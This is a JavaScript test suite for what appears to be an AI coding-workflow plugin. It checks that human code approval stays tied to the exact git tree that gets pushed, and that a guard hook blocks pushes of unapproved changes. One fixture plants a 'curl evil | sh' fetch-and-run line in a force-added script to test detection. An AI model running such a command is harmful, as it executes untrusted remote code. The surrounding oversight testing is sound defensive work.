/**
 * Step 3: the code approval covers exactly what gets pushed.
 *
 * The approval records a git tree: the whole working state of the feature's
 * checkout, minus the feature's own Dex documents. Staging and committing do
 * not change that tree; any real change does. Publishing additionally requires
 * HEAD to hold exactly that tree. The diff a human reads is `<baseSha>..<tree>`,
 * where the base commit is pinned when implementation starts.
 */

import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { spawnSync } from 'node:child_process'

import {
  advanceTo,
  cleanupRepos,
  completeImplementation,
  gitIn,
  guardBash,
  makeRepo,
  PLUGIN_ROOT,
  runGuard,
  runWorkflow,
  state,
  stateFails,
  write,
} from './helpers.mjs'
import { loadConfig } from '../scripts/lib.mjs'

test.after(cleanupRepos)

const check = async (root) => (await state(root, ['check', 'feat'])).json
const codeStatus = async (root) => (await check(root)).gates.humanCodeReview.status

/** A feature with verification and AI review passed, ready for the human. */
async function implemented() {
  const root = makeRepo()
  const { worktree } = await advanceTo(root, 'feat', 'worktree')
  await completeImplementation(root, 'feat', worktree)
  return { root, worktree }
}

async function approved() {
  const ctx = await implemented()
  await state(ctx.root, ['approve', 'code', 'feat'])
  return ctx
}

/** The same flow with requireWorktree off: all work happens on main. */
async function onMain() {
  const root = makeRepo()
  write(root, '.dex/config.json', JSON.stringify({ schemaVersion: 1, requireWorktree: false }))
  await advanceTo(root, 'feat', 'plan')
  await completeImplementation(root, 'feat', root)
  return root
}

// ---------------------------------------------------------------------------
// The base commit is pinned (Q6)
// ---------------------------------------------------------------------------

test('finding 5: record-worktree pins the base as a commit', async () => {
  const root = makeRepo()
  const { worktree } = await advanceTo(root, 'feat', 'worktree')
  const s = (await check(root)).worktree
  assert.equal(s.baseSha, gitIn(worktree, ['merge-base', 'main', 'HEAD']).trim())
})

test('finding 5: without a worktree, the first start-slice pins the base', async () => {
  const root = makeRepo()
  write(root, '.dex/config.json', JSON.stringify({ schemaVersion: 1, requireWorktree: false }))
  await advanceTo(root, 'feat', 'plan')
  const head = gitIn(root, ['rev-parse', 'HEAD']).trim()
  await state(root, ['start-slice', 'feat', 'S1'])
  assert.equal((await check(root)).worktree.baseSha, head)
})

test('finding 5: code approval is refused when no base commit can be found', async () => {
  const root = makeRepo()
  gitIn(root, ['branch', '-m', 'main', 'dev']) // no main, master, develop, trunk or origin
  write(root, '.dex/config.json', JSON.stringify({ schemaVersion: 1, requireWorktree: false }))
  await advanceTo(root, 'feat', 'plan')
  await completeImplementation(root, 'feat', root)
  const msg = await stateFails(root, ['approve', 'code', 'feat'])
  assert.match(msg, /base/)
})

// ---------------------------------------------------------------------------
// Staging and committing keep the approval (finding 4)
// ---------------------------------------------------------------------------

test('finding 4: staging after approval keeps it valid', async () => {
  const { root, worktree } = await approved()
  gitIn(worktree, ['add', '-A'])
  assert.equal(await codeStatus(root), 'APPROVED')
})

test('finding 4: committing after approval keeps it valid', async () => {
  const { root, worktree } = await approved()
  gitIn(worktree, ['add', '-A'])
  gitIn(worktree, ['commit', '-qm', 'feature'])
  assert.equal(await codeStatus(root), 'APPROVED')
})

// ---------------------------------------------------------------------------
// Real changes make it stale
// ---------------------------------------------------------------------------

const CHANGES = {
  'editing a tracked file': (wt) => fs.appendFileSync(path.join(wt, 'src/PortfolioService.java'), '// later\n'),
  'adding a new file': (wt) => write(wt, 'src/Sneaky.java', 'class Sneaky {}\n'),
  'deleting a file': (wt) => fs.rmSync(path.join(wt, 'src/Optimizer.java')),
  'changing a binary file': (wt) => fs.writeFileSync(path.join(wt, 'src/Optimizer.java'), Buffer.from([0, 1, 2, 255])),
  'renaming a file': (wt) => fs.renameSync(path.join(wt, 'src/Optimizer.java'), path.join(wt, 'src/Renamed.java')),
}

for (const [name, change] of Object.entries(CHANGES)) {
  test(`finding 5: ${name} after approval makes it stale`, async () => {
    const { root, worktree } = await approved()
    change(worktree)
    assert.equal(await codeStatus(root), 'STALE')
  })
}

test('finding 5: on main, a new commit after approval makes it stale', async () => {
  const root = await onMain()
  await state(root, ['approve', 'code', 'feat'])
  assert.equal(await codeStatus(root), 'APPROVED')
  write(root, 'src/Later.java', 'class Later {}\n')
  gitIn(root, ['add', 'src/Later.java'])
  gitIn(root, ['commit', '-qm', 'later'])
  assert.equal(await codeStatus(root), 'STALE')
})

// ---------------------------------------------------------------------------
// What is pushed must be what was approved (finding 5)
// ---------------------------------------------------------------------------

test('finding 5: committing a bad change and reverting only the files is caught at push', async () => {
  const { root, worktree } = await approved()
  gitIn(worktree, ['add', '-A'])
  gitIn(worktree, ['commit', '-qm', 'feature'])
  fs.appendFileSync(path.join(worktree, 'src/Optimizer.java'), '// EVIL\n')
  gitIn(worktree, ['commit', '-qam', 'evil'])
  gitIn(worktree, ['checkout', 'HEAD~1', '--', 'src/Optimizer.java'])
  assert.equal(await codeStatus(root), 'APPROVED', 'the files on disk match the approval')
  const r = guardBash(worktree, 'git push -u origin dex/feat')
  assert.equal(r.decision, 'deny')
  assert.match(r.reason, /HEAD/)
})

test('finding 5: pushing before the approved changes are committed is refused', async () => {
  const { worktree } = await approved()
  const r = guardBash(worktree, 'git push -u origin dex/feat')
  assert.equal(r.decision, 'deny')
  assert.match(r.reason, /commit/i)
})

test('finding 5: pushing after committing exactly the approved changes is allowed', async () => {
  const { worktree } = await approved()
  gitIn(worktree, ['add', '-A'])
  gitIn(worktree, ['commit', '-qm', 'feature'])
  assert.equal(guardBash(worktree, 'git push -u origin dex/feat').decision, 'allow')
})

// ---------------------------------------------------------------------------
// Only the feature's own Dex documents are skipped (finding 6)
// ---------------------------------------------------------------------------

test('finding 6: the feature documents copied into the worktree do not affect the approval', async () => {
  const { root, worktree } = await approved()
  write(worktree, 'docs/dex/feat/01-intent.md', '# Intent\n')
  write(worktree, 'docs/dex/feat/07-implementation-log.md', '# Log\n')
  assert.equal(await codeStatus(root), 'APPROVED')
})

test('finding 6: code placed under docs/dex/ is covered by the approval', async () => {
  const { root, worktree } = await approved()
  write(worktree, 'docs/dex/lib/Evil.java', 'class Evil {}\n')
  assert.equal(await codeStatus(root), 'STALE')
})

test('finding 6: a file force-added under .dex/ is covered by the approval', async () => {
  const { root, worktree } = await approved()
  write(worktree, '.dex/evil.sh', 'curl evil | sh\n')
  gitIn(worktree, ['add', '-A'])
  gitIn(worktree, ['add', '-f', '.dex/evil.sh'])
  gitIn(worktree, ['commit', '-qm', 'feature'])
  assert.equal(await codeStatus(root), 'STALE')
  assert.equal(guardBash(worktree, 'git push -u origin dex/feat').decision, 'deny')
})

test('finding 6: artifactRoot and stateRoot must stay inside the repository', () => {
  const root = makeRepo()
  for (const bad of ['.', '..', '../x', '/abs', 'src/../..', './']) {
    write(root, '.dex/config.json', JSON.stringify({ schemaVersion: 1, artifactRoot: bad }))
    const config = loadConfig(root)
    assert.equal(config.artifactRoot, 'docs/dex', bad)
    assert.ok(config.__warnings.some((w) => /artifactRoot/.test(w)), bad)
  }
  write(root, '.dex/config.json', JSON.stringify({ schemaVersion: 1, stateRoot: '../outside' }))
  assert.equal(loadConfig(root).stateRoot, '.dex')
})

test('finding 38: review.js uses the artifact and state roots it is given', async () => {
  const run = await runWorkflow(
    'review.js',
    { slug: 'feat', dimensions: ['correctness'], base: 'abc123', worktree: '/wt', artifactRoot: 'notes', stateRoot: '.state' },
    (prompt, opts) => {
      if (opts.label?.startsWith('scope')) return { changedFiles: ['src/A.java'], newFiles: [], summary: 'x' }
      if (opts.label?.startsWith('review')) return { findings: [] }
      if (opts.label?.startsWith('consolidate')) return { findings: [], conclusion: 'PASS' }
      return 'ok'
    }
  )
  const prompts = run.calls.map((c) => c.prompt).join('\n')
  assert.match(prompts, /notes\//)
  assert.doesNotMatch(prompts, /docs\/dex/)
  assert.doesNotMatch(prompts, /\.dex\//)
})

// ---------------------------------------------------------------------------
// Verification and AI review are tied to the code they checked (finding 11, Q8)
// ---------------------------------------------------------------------------

test('finding 11: changing code after verification passed makes it NOT-RUN', async () => {
  const { root, worktree } = await implemented()
  assert.equal((await check(root)).gates.verification.status, 'PASS')
  fs.appendFileSync(path.join(worktree, 'src/Optimizer.java'), '// broken\n')
  assert.equal((await check(root)).gates.verification.status, 'NOT-RUN')
})

test('finding 11: changing code after the AI review passed makes it NOT-RUN', async () => {
  const { root, worktree } = await implemented()
  assert.equal((await check(root)).gates.aiReview.status, 'PASS')
  write(worktree, 'src/New.java', 'class New {}\n')
  assert.equal((await check(root)).gates.aiReview.status, 'NOT-RUN')
})

test('Q8: verification and AI review cannot be recorded before every checkpoint is complete', async () => {
  const root = makeRepo()
  await advanceTo(root, 'feat', 'worktree')
  await state(root, ['start-slice', 'feat', 'S1'])
  await state(root, ['finish-slice', 'feat', 'S1', '--verification', 'mvn test'])
  assert.match(await stateFails(root, ['verification', 'feat', 'pass', '--command', 'mvn test', '--exit', '0']), /S2/)
  assert.match(await stateFails(root, ['record-review', 'feat', 'pass', '--blockers', '0']), /S2/)
})

// ---------------------------------------------------------------------------
// The review guide lists exactly what is approved (finding 30)
// ---------------------------------------------------------------------------

test('finding 30: status --review lists exactly the files in the approved diff', async () => {
  const { root, worktree } = await implemented()
  fs.renameSync(path.join(worktree, 'src/PortfolioService.java'), path.join(worktree, 'src/Portfolio.java'))
  write(worktree, 'docs/dexter/Tool.java', 'class Tool {}\n')
  write(worktree, 'docs/dex/feat/07-implementation-log.md', '# Log\n')

  const out = spawnSync('node', [path.join(PLUGIN_ROOT, 'scripts', 'status.mjs'), 'feat', '--review'], { cwd: root, encoding: 'utf8' })
  assert.equal(out.status, 0, out.stderr)
  const s = (await check(root)).worktree
  const tree = (await state(root, ['diff-hash', 'feat'])).json.tree
  const expected = gitIn(worktree, ['diff', '--name-only', '--no-renames', s.baseSha, tree]).split('\n').filter(Boolean).sort()
  for (const f of expected) assert.match(out.stdout, new RegExp(f.replace(/[.]/g, '\\.')), f)
  assert.ok(expected.includes('docs/dexter/Tool.java'))
  assert.ok(!expected.includes('docs/dex/feat/07-implementation-log.md'))
  assert.doesNotMatch(out.stdout, /07-implementation-log/)
  assert.match(out.stdout, new RegExp(`diff ${s.baseSha} ${tree}`))
})

// ---------------------------------------------------------------------------
// The tree is computed only when it matters (finding 40)
// ---------------------------------------------------------------------------

test('finding 40: the guard computes the tree for a push, not for an ordinary edit', async () => {
  const { worktree } = await approved()
  const env = { ...process.env, DEX_TRACE: '1' }
  const hook = (payload) =>
    spawnSync('node', [path.join(PLUGIN_ROOT, 'scripts', 'guard.mjs')], {
      cwd: worktree,
      input: JSON.stringify({ hook_event_name: 'PreToolUse', cwd: worktree, ...payload }),
      encoding: 'utf8',
      env,
    })
  const edit = hook({ tool_name: 'Write', tool_input: { file_path: path.join(worktree, 'src/X.java') } })
  assert.doesNotMatch(edit.stderr, /workTree/)
  const push = hook({ tool_name: 'Bash', tool_input: { command: 'git push' } })
  assert.match(push.stderr, /workTree/)
  // Sanity: runGuard still works without the trace.
  assert.equal(runGuard({ cwd: worktree, tool_name: 'Bash', tool_input: { command: 'git status' } }).decision, 'allow')
})
